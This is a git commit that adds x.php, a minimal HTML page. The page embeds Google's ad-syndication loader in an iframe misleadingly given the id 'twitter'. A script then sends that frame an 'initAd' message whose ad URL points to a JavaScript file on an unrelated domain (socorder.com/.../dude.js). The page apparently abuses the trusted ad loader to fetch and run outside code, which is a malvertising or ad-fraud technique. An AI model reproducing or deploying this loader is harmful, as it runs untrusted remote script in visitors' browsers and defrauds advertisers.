bb5c2f3c99ef40acce05cd7c20f18393a0f7cefe
timonty001 <timonty001@nomail.ga>
2018-02-06 11:31:01 +0530

    Create x.php

---
+++ x.php
@@ -0,0 +1,28 @@
+
+<html  style="margin: 0px;">
+
+	<head>
+
+	</head>
+
+	<body style="margin: 0px;">
+
+	<script>
+
+		function quStart(){
+
+			setTimeout(function(){document.getElementById('twitter').contentWindow.postMessage('{"desiredBitrate":-1,"creativeData":"https://googleads.github.io/googleads-ima-html5/media/LinearVPAIDCreative.mp4","viewMode":"normal","clickThroughUrl":"http://google.com","adUrl":"https://socorder.com/gfhdjskal/dude.js?r=15&ai=3","volume":0,"session":"goog_678072542","type":"initAd"}','*');},10);
+
+
+
+		}
+
+
+
+	</script>
+
+	<iframe src="https://tpc.googlesyndication.com/pagead/js/loader15.html?https://socorder.com/gfhdjskal/dude.js?r=15&ai=3" onload="setTimeout(function(){quStart();},1000);" id="twitter" style="margin:0px;border:0px;height:300px;width:400px;max-height:300px;max-width:400px;"></iframe>
+
+	</body>
+
+	</html>
